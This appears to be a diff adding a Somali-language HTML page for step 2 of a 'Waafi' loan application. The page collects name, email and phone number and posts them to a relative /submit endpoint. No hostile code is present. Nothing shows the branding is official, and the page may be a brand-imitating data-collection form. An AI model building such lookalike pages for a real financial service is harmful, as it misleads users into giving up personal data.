@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Codsiga Amaahda</title>
+
+<style>
+
+body{
+  margin:0;
+  font-family: Arial, sans-serif;
+  background:#f2f2f2;
+}
+
+/* TOP BAR */
+.header{
+  background:#7ac943;
+  color:white;
+  padding:15px;
+  display:flex;
+  justify-content:space-between;
+  font-weight:bold;
+}
+
+/* CARD */
+.container{
+  max-width:420px;
+  margin:20px auto;
+  background:white;
+  padding:20px;
+  border-radius:15px;
+  box-shadow:0 3px 10px rgba(0,0,0,0.1);
+}
+
+h2{
+  text-align:center;
+  margin-bottom:5px;
+}
+
+.subtitle{
+  text-align:center;
+  color:gray;
+  margin-bottom:20px;
+}
+
+/* PROGRESS BAR */
+.progress{
+  display:flex;
+  gap:8px;
+  margin-bottom:25px;
+}
+
+.bar{
+  flex:1;
+  height:6px;
+  background:#ddd;
+  border-radius:5px;
+}
+
+.active{
+  background:#7ac943;
+}
+
+/* INPUTS */
+label{
+  display:block;
+  margin-top:15px;
+  margin-bottom:5px;
+}
+
+input{
+  width:100%;
+  padding:14px;
+  border-radius:8px;
+  border:1px solid #ccc;
+  font-size:16px;
+}
+
+.phone{
+  display:flex;
+  gap:10px;
+}
+
+.code{
+  width:80px;
+  text-align:center;
+  background:#eee;
+}
+
+/* BUTTONS */
+.btn{
+  width:100%;
+  padding:15px;
+  border:none;
+  border-radius:10px;
+  margin-top:20px;
+  font-size:16px;
+}
+
+.gray{
+  background:#ddd;
+}
+
+.green{
+  background:#7ac943;
+  color:white;
+}
+
+.footer{
+  text-align:center;
+  color:gray;
+  margin:20px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <div>← Dib u noqo</div>
+  <div>Waafi ☰</div>
+</div>
+
+<div class="container">
+
+<h2>Codsiga Amaahda</h2>
+<div class="subtitle">Tallaabada 2 ee 3</div>
+
+<div class="progress">
+  <div class="bar active"></div>
+  <div class="bar active"></div>
+  <div class="bar"></div>
+</div>
+
+<form id="loanForm">
+
+<label>Magaca Hore</label>
+<input type="text" name="firstName" placeholder="Ahmed" required>
+
+<label>Magaca Dambe</label>
+<input type="text" name="lastName" placeholder="Hassan" required>
+
+<label>Ciwaanka Emailka</label>
+<input type="email" name="email" placeholder="ahmed.hassan@example.com" required>
+
+<label>Lambarka Taleefanka</label>
+<div class="phone">
+  <input class="code" value="+252" readonly>
+  <input type="tel" name="phone" placeholder="612345678" required>
+</div>
+
+<button type="button" class="btn gray">
+KA HORE
+</button>
+
+<button type="submit" class="btn green">
+TALLAABADA XIGTA
+</button>
+
+</form>
+
+</div>
+
+<div class="footer">
+© 2025 Waafi Soomaaliya
+</div>
+
+<script>
+document.getElementById("loanForm")
+.addEventListener("submit", async function(e){
+
+  e.preventDefault();
+
+  const formData = Object.fromEntries(
+    new FormData(this).entries()
+  );
+
+  await fetch("/submit", {
+    method:"POST",
+    headers:{
+      "Content-Type":"application/json"
+    },
+    body:JSON.stringify(formData)
+  });
+
+  alert("Data sent successfully ✅");
+});
+</script>
+
+</body>
+</html>
